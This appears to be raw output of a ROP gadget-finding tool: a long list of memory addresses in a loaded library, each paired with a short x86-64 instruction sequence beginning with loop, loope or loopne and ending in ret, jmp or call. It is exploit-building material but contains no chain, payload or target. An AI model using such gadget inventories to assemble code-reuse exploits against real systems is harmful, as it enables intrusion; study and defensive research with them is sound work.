0x00002aaaaac5d9c0 : loop 0x18894e ; hlt ; jmp rdx
0x00002aaaaac5d9c4 : loop 0x188952 ; hlt ; call rsp
0x00002aaaaac5d9d0 : loop 0x18895e ; hlt ; jmp rdx
0x00002aaaaac5d9d4 : loop 0x188962 ; hlt ; jmp rdx
0x00002aaaaac5d9d8 : loop 0x188966 ; hlt ; jmp rdx
0x00002aaaaac5d9dc : loop 0x18896a ; hlt ; jmp rdx
0x00002aaaaac5d9e0 : loop 0x18896e ; hlt ; jmp rdx
0x00002aaaaac5d9e4 : loop 0x188972 ; hlt ; jmp rdx
0x00002aaaaac5d9e8 : loop 0x188976 ; hlt ; jmp rdx
0x00002aaaaac5d9ec : loop 0x18897a ; hlt ; jmp rdx
0x00002aaaaac5d9f0 : loop 0x18897e ; hlt ; jmp rdx
0x00002aaaaac5d9f4 : loop 0x188982 ; hlt ; jmp rdx
0x00002aaaaac5d9f8 : loop 0x188986 ; hlt ; jmp rdx
0x00002aaaaac5d9fc : loop 0x18898a ; hlt ; jmp rdx
0x00002aaaaac5da00 : loop 0x18898e ; hlt ; jmp rdx
0x00002aaaaac5da04 : loop 0x188992 ; hlt ; jmp rdx
0x00002aaaaac5da08 : loop 0x188996 ; hlt ; jmp rdx
0x00002aaaaac5da0c : loop 0x18899a ; hlt ; jmp rdx
0x00002aaaaac5da10 : loop 0x18899e ; hlt ; jmp rdx
0x00002aaaaac5da14 : loop 0x1889a2 ; hlt ; jmp rdx
0x00002aaaaac5ec68 : loop 0x189cf1 ; idiv bh ; loop 0x189cf5 ; idiv bh ; pop rsp ; jle 0x189c74 ; jmp rdx
0x00002aaaaac5ec6c : loop 0x189cf1 ; idiv bh ; pop rsp ; jle 0x189c70 ; jmp rdx
0x00002aaaaac5ec74 : loop 0x189cf9 ; idiv bh ; jle 0x189c78 ; jmp rdx
0x00002aaaaac5ecc0 : loop 0x189d49 ; idiv bh ; imul edi, dword ptr [rdx - 0xa], -1 ; scasb al, byte ptr [rdi] ; jns 0x189ccc ; jmp qword ptr [rdx]
0x00002aaaaac6c11d : loop 0x197125 ; add byte ptr [rsi + rbp*2], ah ; out dx, al ; call rsp
0x00002aaaaac82f39 : loop 0x1adf31 ; jmp qword ptr [rcx]
0x00002aaaaac89ee9 : loop 0x1b4ee3 ; call rcx
0x00002aaaaac8a8a9 : loop 0x1b58a8 ; call rsi
0x00002aaaaaaf4a38 : loop 0x1fa24 ; ret 0xf58
0x00002aaaaaad75e5 : loop 0x25bf ; ret 0x23cb
0x00002aaaaab0ae06 : loop 0x35e13 ; mov dword ptr [rbx + 8], edx ; add rsp, 0x40 ; pop rbx ; ret
0x00002aaaaab0af3d : loop 0x35f92 ; shr eax, 6 ; or qword ptr [rdi + rax*8], rdx ; xor eax, eax ; ret
0x00002aaaaab0f689 : loop 0x3a6b3 ; mov rax, rcx ; or rax, rdx ; ret
0x00002aaaaab2ad0d : loop 0x55c9a ; ret
0x00002aaaaab3410b : loop 0x5f114 ; dec dword ptr [rcx + rcx*4 - 1] ; call 0x7b3a8
0x00002aaaaab3a891 : loop 0x65819 ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaab40cc2 : loop 0x6bc54 ; or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaab4a9b4 : loop 0x759bb ; mov eax, edx ; ret
0x00002aaaaab4aaa4 : loop 0x75aab ; mov eax, edx ; ret
0x00002aaaaab5c044 : loop 0x87096 ; mov edi, edi ; call rax
0x00002aaaaab63921 : loop 0x8e94d ; jne 0x8e811 ; mov rax, rdi ; ret
0x00002aaaaab6395d : loop 0x8e971 ; jne 0x8e811 ; mov rax, rdi ; ret
0x00002aaaaab63b47 : loop 0x8eb93 ; jne 0x8e811 ; mov rax, rdi ; ret
0x00002aaaaab63c46 : loop 0x8ecd2 ; jne 0x8e811 ; mov rax, rdi ; ret
0x00002aaaaab73c5d : loop 0x9ec95 ; shr byte ptr [rcx], 0xc8 ; ret
0x00002aaaaab7ac9a : loop 0xa5ca5 ; add byte ptr [rax], al ; ret
0x00002aaaaab7f0a5 : loop 0xaa0bf ; movsxd rsi, dword ptr [rax + rdx*4] ; add rax, rsi ; jmp rax
0x00002aaaaab816df : loop 0xac736 ; lea ecx, dword ptr [rsp + 0x70] ; mov rdi, rbp ; call rbx
0x00002aaaaab819a8 : loop 0xac9ff ; lea ecx, dword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00002aaaaab9613f : loop 0xc1145 ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaabb828a : loop 0xe330a ; cli ; dec dword ptr [rcx - 0x77] ; ret 0x448b
0x00002aaaaabb942c : loop 0xe4438 ; xor esi, esi ; call 0x8e698
0x00002aaaaabb957f : loop 0xe4584 ; add esi, esi ; ret
0x00002aaaaabc2f62 : loop 0xedeeb ; ret 0x850f
0x00002aaaaabe5526 : loope 0x110534 ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaabec18a : loope 0x1171de ; mov esi, esp ; call 0x73446
0x00002aaaaabfce03 : loope 0x127dbe ; sub dword ptr [rax], eax ; mov rax, qword ptr fs:[rax] ; ret
0x00002aaaaabfea1d : loope 0x129a76 ; mov esi, esp ; mov rdi, rbx ; mov r13, rsp ; call r15
0x00002aaaaac0250d : loope 0x12d580 ; nop ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0666e : loope 0x131603 ; ret
0x00002aaaaac2b796 : loope 0x1567a6 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2b834 : loope 0x156844 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2ef4a : loope 0x159f45 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac2ef49 : loope 0x159f46 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31a1a : loope 0x15ca15 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac31a19 : loope 0x15ca16 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac3453a : loope 0x15f535 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac34539 : loope 0x15f536 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac3d04b : loope 0x168052 ; add byte ptr [rax], al ; ret
0x00002aaaaac44edb : loope 0x16fee5 ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac48416 : loope 0x17346b ; add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac48736 : loope 0x173795 ; ret
0x00002aaaaac5a519 : loope 0x18551c ; jmp qword ptr [rdi]
0x00002aaaaac5a599 : loope 0x18559c ; jmp qword ptr [rdi]
0x00002aaaaac5a619 : loope 0x18561c ; jmp qword ptr [rdi]
0x00002aaaaac5a699 : loope 0x18569c ; jmp qword ptr [rdi]
0x00002aaaaac5a719 : loope 0x18571c ; jmp qword ptr [rdi]
0x00002aaaaac5a799 : loope 0x18579c ; jmp qword ptr [rdi]
0x00002aaaaac5efe9 : loope 0x189ff3 ; add byte ptr [rcx], al ; adc byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaac693d8 : loope 0x19437e ; std ; jmp rcx
0x00002aaaaac693d8 : loope 0x194382 ; std ; jmp rcx
0x00002aaaaac693dc : loope 0x194383 ; std ; jmp rcx
0x00002aaaaac693dc : loope 0x19438b ; std ; jmp rcx
0x00002aaaaac69685 : loope 0x194684 ; jmp qword ptr [rax]
0x00002aaaaac6c0ed : loope 0x1970f5 ; add byte ptr [rdx + rbp*2 - 0x12], al ; jmp rsp
0x00002aaaaab0ad6e : loope 0x35d77 ; add byte ptr [rax], al ; adc byte ptr [rdi], cl ; ret 0x8b48
0x00002aaaaab1d987 : loope 0x489d9 ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab1d9b8 : loope 0x48a0b ; mov dword ptr [rdi - 8], ecx ; ret
0x00002aaaaab1da2d : loope 0x48a80 ; mov dword ptr [rdi - 0x10], ecx ; ret
0x00002aaaaab4a8c1 : loope 0x75896 ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab57147 : loope 0x8215e ; add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaab5a950 : loope 0x8598e ; add byte ptr [rbp + 0xa], dh ; jmp 0x85982
0x00002aaaaab68d3b : loope 0x93d4d ; movsxd rcx, dword ptr [rax + rcx*4] ; add rax, rcx ; jmp rax
0x00002aaaaab68ee2 : loope 0x93f39 ; or ecx, edx ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaab68fab : loope 0x93fbd ; movsxd rcx, dword ptr [rax + rcx*4] ; add rax, rcx ; jmp rax
0x00002aaaaab7b419 : loope 0xa648b ; nop dword ptr [rax + rax] ; mov rax, rdi ; ret
0x00002aaaaab7cc29 : loope 0xa7c9b ; nop dword ptr [rax + rax] ; mov rax, rdi ; ret
0x00002aaaaab7e49d : loope 0xa94b7 ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab7e4a9 : loope 0xa9518 ; nop dword ptr [rax + rax] ; ret
0x00002aaaaab7f0e7 : loope 0xaa0a8 ; or byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaab7f1ce : loope 0xaa1c5 ; ret
0x00002aaaaab8036e : loope 0xab383 ; je 0xab394 ; ret
0x00002aaaaab8f46a : loope 0xba4c2 ; lea ecx, dword ptr [rsp + 0x30] ; mov rdi, qword ptr [rax] ; call r14
0x00002aaaaab9ce0d : loope 0xc7d9a ; ret 0xf631
0x00002aaaaabab6d9 : loope 0xd66de ; add esi, esi ; ret
0x00002aaaaabd6270 : loopne 0x101276 ; jmp 0x10123a
0x00002aaaaabda0da : loopne 0x10512f ; add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabda37e : loopne 0x1053e4 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabde88e : loopne 0x109894 ; ret
0x00002aaaaabde8aa : loopne 0x1098b9 ; movzx eax, ax ; ret
0x00002aaaaabde91e : loopne 0x109924 ; ret
0x00002aaaaabde9be : loopne 0x1099c4 ; ret
0x00002aaaaabde9da : loopne 0x1099df ; ret
0x00002aaaaabdea4e : loopne 0x109a54 ; ret
0x00002aaaaabdea6a : loopne 0x109a73 ; movzx eax, ax ; ret
0x00002aaaaabdeade : loopne 0x109ae4 ; ret
0x00002aaaaabdeb6e : loopne 0x109b74 ; ret
0x00002aaaaabdec0e : loopne 0x109c14 ; ret
0x00002aaaaabdecae : loopne 0x109cb4 ; ret
0x00002aaaaabded4e : loopne 0x109d54 ; ret
0x00002aaaaabded6a : loopne 0x109d75 ; movzx eax, ax ; ret
0x00002aaaaabdedde : loopne 0x109de4 ; ret
0x00002aaaaabdee79 : loopne 0x109e7f ; ret
0x00002aaaaabdef0e : loopne 0x109f14 ; ret
0x00002aaaaabdf0ea : loopne 0x10a0f0 ; ret
0x00002aaaaabdf230 : loopne 0x10a236 ; ret
0x00002aaaaabdf243 : loopne 0x10a252 ; movzx eax, ax ; ret
0x00002aaaaabdf2b0 : loopne 0x10a2b6 ; ret
0x00002aaaaabdf330 : loopne 0x10a336 ; ret
0x00002aaaaabdf343 : loopne 0x10a348 ; ret
0x00002aaaaabdf3b0 : loopne 0x10a3b6 ; ret
0x00002aaaaabdf3c3 : loopne 0x10a3cc ; movzx eax, ax ; ret
0x00002aaaaabdf430 : loopne 0x10a436 ; ret
0x00002aaaaabdf4b0 : loopne 0x10a4b6 ; ret
0x00002aaaaabdf530 : loopne 0x10a536 ; ret
0x00002aaaaabdf5b0 : loopne 0x10a5b6 ; ret
0x00002aaaaabdf630 : loopne 0x10a636 ; ret
0x00002aaaaabdf643 : loopne 0x10a64e ; movzx eax, ax ; ret
0x00002aaaaabdf6b0 : loopne 0x10a6b6 ; ret
0x00002aaaaabdf72d : loopne 0x10a733 ; ret
0x00002aaaaabdf7b0 : loopne 0x10a7b6 ; ret
0x00002aaaaabdf95a : loopne 0x10a960 ; ret
0x00002aaaaabe8e3b : loopne 0x113e40 ; ret
0x00002aaaaabe9568 : loopne 0x11457d ; cmp eax, 4 ; je 0x114577 ; ret
0x00002aaaaabe9739 : loopne 0x11474c ; pop rbp ; pop r12 ; ret
0x00002aaaaabe9f55 : loopne 0x114fa7 ; lea edi, dword ptr [rip - 0x16d] ; call rax
0x00002aaaaabf7434 : loopne 0x122433 ; add eax, 0x10 ; ret
0x00002aaaaabf7c85 : loopne 0x122ced ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaabf856b : loopne 0x123578 ; cdqe ; shr rax, 4 ; ret
0x00002aaaaabff4ea : loopne 0x12a53f ; add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac0b89c : loopne 0x1368aa ; sub eax, 1 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0c7b7 : loopne 0x1377c0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac0eebd : loopne 0x139f30 ; nop ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax + 8] ; jmp rax
0x00002aaaaac10b11 : loopne 0x13bb81 ; nop dword ptr [rax + rax] ; ret
0x00002aaaaac1384c : loopne 0x13e8b4 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaac21e82 : loopne 0x14ce4f ; jp 0x14cf0b ; jp 0x14ce7e ; ret
0x00002aaaaac22372 : loopne 0x14d33f ; jp 0x14d3fb ; jp 0x14d36e ; ret
0x00002aaaaac22715 : loopne 0x14d6e2 ; jp 0x14d79e ; jp 0x14d711 ; ret
0x00002aaaaac25951 : loopne 0x150968 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25950 : loopne 0x150969 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25aa1 : loopne 0x150ab8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25aa0 : loopne 0x150ab9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25bf1 : loopne 0x150c08 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25bf0 : loopne 0x150c09 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25d41 : loopne 0x150d58 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25d40 : loopne 0x150d59 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25e91 : loopne 0x150ea8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25e90 : loopne 0x150ea9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25fe1 : loopne 0x150ff8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac25fe0 : loopne 0x150ff9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26131 : loopne 0x151148 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26130 : loopne 0x151149 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2627f : loopne 0x151296 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2627e : loopne 0x151297 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac263d1 : loopne 0x1513e8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac263d0 : loopne 0x1513e9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26521 : loopne 0x151538 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26520 : loopne 0x151539 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26671 : loopne 0x151688 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26670 : loopne 0x151689 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac267c1 : loopne 0x1517d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac267c0 : loopne 0x1517d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26911 : loopne 0x151928 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26910 : loopne 0x151929 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26a61 : loopne 0x151a78 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26a60 : loopne 0x151a79 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26bb1 : loopne 0x151bc8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac26bb0 : loopne 0x151bc9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28321 : loopne 0x153338 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28320 : loopne 0x153339 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28471 : loopne 0x153488 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28470 : loopne 0x153489 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac285c1 : loopne 0x1535d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac285c0 : loopne 0x1535d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28711 : loopne 0x153728 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28710 : loopne 0x153729 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28861 : loopne 0x153878 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28860 : loopne 0x153879 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac289b1 : loopne 0x1539c8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac289b0 : loopne 0x1539c9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28b01 : loopne 0x153b18 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28b00 : loopne 0x153b19 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28c4f : loopne 0x153c66 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28c4e : loopne 0x153c67 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28da1 : loopne 0x153db8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28da0 : loopne 0x153db9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28ef1 : loopne 0x153f08 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac28ef0 : loopne 0x153f09 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29041 : loopne 0x154058 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29040 : loopne 0x154059 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29191 : loopne 0x1541a8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29190 : loopne 0x1541a9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac292e1 : loopne 0x1542f8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac292e0 : loopne 0x1542f9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29431 : loopne 0x154448 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29430 : loopne 0x154449 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29581 : loopne 0x154598 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac29580 : loopne 0x154599 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2acf1 : loopne 0x155d08 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2acf0 : loopne 0x155d09 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2ae41 : loopne 0x155e58 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2ae40 : loopne 0x155e59 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2af91 : loopne 0x155fa8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2af90 : loopne 0x155fa9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b0e1 : loopne 0x1560f8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b0e0 : loopne 0x1560f9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b231 : loopne 0x156248 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b230 : loopne 0x156249 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b381 : loopne 0x156398 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b380 : loopne 0x156399 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b4d1 : loopne 0x1564e8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b4d0 : loopne 0x1564e9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b61f : loopne 0x156636 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b61e : loopne 0x156637 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b771 : loopne 0x156788 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b770 : loopne 0x156789 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b8c1 : loopne 0x1568d8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b8c0 : loopne 0x1568d9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2b8e6 : loopne 0x1568f6 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2b984 : loopne 0x156994 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2ba11 : loopne 0x156a28 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2ba10 : loopne 0x156a29 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bb61 : loopne 0x156b78 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bb60 : loopne 0x156b79 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bcb1 : loopne 0x156cc8 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bcb0 : loopne 0x156cc9 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2be01 : loopne 0x156e18 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2be00 : loopne 0x156e19 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bf51 : loopne 0x156f68 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac2bf50 : loopne 0x156f69 ; sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00002aaaaac4149c : loopne 0x16c4aa ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac46ef5 : loopne 0x171f46 ; sub eax, edx ; vzeroupper ; ret
0x00002aaaaac46ef4 : loopne 0x171f47 ; sub eax, edx ; vzeroupper ; ret
0x00002aaaaac56358 : loopne 0x181382 ; jmp 0x18135e
0x00002aaaaac5635c : loopne 0x181386 ; jmp 0x181362
0x00002aaaaac56360 : loopne 0x18138a ; jmp 0x181366
0x00002aaaaac56364 : loopne 0x18138e ; jmp 0x18136a
0x00002aaaaac56368 : loopne 0x181392 ; jmp 0x18136e
0x00002aaaaac5636c : loopne 0x181396 ; jmp 0x181372
0x00002aaaaac56370 : loopne 0x18139a ; jmp 0x181376
0x00002aaaaac56374 : loopne 0x18139e ; jmp 0x18137a
0x00002aaaaac56378 : loopne 0x1813a2 ; jmp 0x18137e
0x00002aaaaac57814 : loopne 0x1827f4 ; cld ; test al, 0x97 ; xchg eax, esp ; ret
0x00002aaaaac5835c : loopne 0x1833b3 ; sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaac5c264 : loopne 0x18725d ; int1 ; push rax ; in al, dx ; int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac5c2d8 : loopne 0x1872d3 ; int1 ; push rax ; out dx, al ; int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5c3f8 : loopne 0x1873fd ; call qword ptr [rax]
0x00002aaaaac5c424 : loopne 0x18742e ; push rax ; add edx, esi ; call qword ptr [rax]
0x00002aaaaac5c46c : loopne 0x187478 ; inc dword ptr [rax] ; add al, 0xf2 ; jmp qword ptr [rax]
0x00002aaaaac5d544 : loopne 0x188599 ; hlt ; push rax ; hlt ; jmp rax
0x00002aaaaac5d54c : loopne 0x18859d ; hlt ; jmp rax
0x00002aaaaac5d558 : loopne 0x1885a9 ; hlt ; jmp rax
0x00002aaaaac5d56c : loopne 0x1885c1 ; hlt ; jmp qword ptr [rax + 0x22fff44c]
0x00002aaaaac5d974 : loopne 0x1889cf ; hlt ; push rax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d97c : loopne 0x1889d3 ; hlt ; jmp rax
0x00002aaaaac5d988 : loopne 0x1889df ; hlt ; jmp rax
0x00002aaaaac5d980 : loopne 0x1889df ; hlt ; push qword ptr [rax - 0x1f000bad] ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d99c : loopne 0x1889f7 ; hlt ; jmp qword ptr [rax + 0x26fff452]
0x00002aaaaac5f4bc : loopne 0x18a4e9 ; cli ; call rax
0x00002aaaaac69288 : loopne 0x1942a7 ; sti ; call qword ptr [rax]
0x00002aaaaac6973c : loopne 0x19471c ; sti ; call rax
0x00002aaaaac6a08c : loopne 0x195016 ; cld ; push qword ptr [rsi - 0x7f] ; cld ; jmp rsi
0x00002aaaaac6c0c5 : loopne 0x1970cd ; add ah, dl ; out dx, al ; call rsp
0x00002aaaaac796d9 : loopne 0x1a46e5 ; add ecx, dword ptr [rip + 0x380e0a03] ; ret
0x00002aaaaac7ad80 : loopne 0x1a5d0d ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac7adb0 : loopne 0x1a5d3d ; out dx, al ; jmp rbx
0x00002aaaaac7b7d0 : loopne 0x1a67d6 ; out dx, eax ; jmp rsi
0x00002aaaaac7f070 : loopne 0x1aa089 ; call qword ptr [rdx]
0x00002aaaaac81c10 : loopne 0x1acc7b ; stc ; call qword ptr [rax]
0x00002aaaaac81dc0 : loopne 0x1acd55 ; hlt ; call qword ptr [rcx]
0x00002aaaaac822b0 : loopne 0x1ad24f ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84730 : loopne 0x1af788 ; cmc ; call qword ptr [rdx]
0x00002aaaaac84ed0 : loopne 0x1aff44 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85110 : loopne 0x1b0187 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac90aca : loopne 0x1bbad9 ; ret 0xb
0x00002aaaaac90b22 : loopne 0x1bbb30 ; ret 0xa
0x00002aaaaaaffa18 : loopne 0x2aa80 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab01c6f : loopne 0x2ccd7 ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaab02d13 : loopne 0x2dd22 ; movzx eax, ax ; ret
0x00002aaaaab02d53 : loopne 0x2dd5c ; movzx eax, ax ; ret
0x00002aaaaab02df3 : loopne 0x2ddfe ; movzx eax, ax ; ret
0x00002aaaaab02ed3 : loopne 0x2ded8 ; ret
0x00002aaaaab02f4c : loopne 0x2df51 ; ret
0x00002aaaaab02f5c : loopne 0x2df6b ; movzx eax, ax ; ret
0x00002aaaaab02f9c : loopne 0x2dfa5 ; movzx eax, ax ; ret
0x00002aaaaab02f23 : loopne 0x2dfa6 ; ret
0x00002aaaaab0303c : loopne 0x2e047 ; movzx eax, ax ; ret
0x00002aaaaab07c87 : loopne 0x32cef ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab09a62 : loopne 0x34aad ; or rax, rdx ; movq xmm0, rax ; ret
0x00002aaaaab09cb5 : loopne 0x34cd9 ; or eax, ecx ; movd xmm1, eax ; movaps xmm0, xmm1 ; ret
0x00002aaaaab09e75 : loopne 0x34e81 ; ret
0x00002aaaaab0a187 : loopne 0x3516e ; fsub dword ptr [rip + 0x200] ; ret
